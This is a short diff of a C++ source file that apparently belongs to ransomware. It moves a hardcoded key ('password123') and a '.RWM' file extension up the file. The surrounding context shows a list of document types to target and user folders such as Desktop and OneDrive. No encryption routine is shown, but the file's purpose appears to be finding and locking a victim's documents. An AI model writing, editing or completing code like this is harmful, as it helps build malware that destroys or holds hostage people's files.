@@ -16,6 +16,9 @@
 
 namespace fs = std::filesystem;
 
+const std::string password_key = "password123";
+const std::string extension = ".RWM";
+
 // Target file extensions (case-insensitive)
 const std::set<std::string> TargetExtensions = {
     ".pdf", ".doc", ".docx", ".xls", ".xlsx", ".ppt", ".pptx", ".rtf", ".txt", ".odt", ".ods", ".odp", ".tex", ".log", ".csv", ".accd", ".accdb",
@@ -46,9 +49,6 @@ const std::vector<std::string> Folders = {
     "OneDrive",
     "Desktop"
 };
-
-const std::string password_key = "password123";
-const std::string extension = ".RWM";
 
 // Check if file has target extension (case-insensitive)
 bool checkFileExtension(const std::string& filename) {
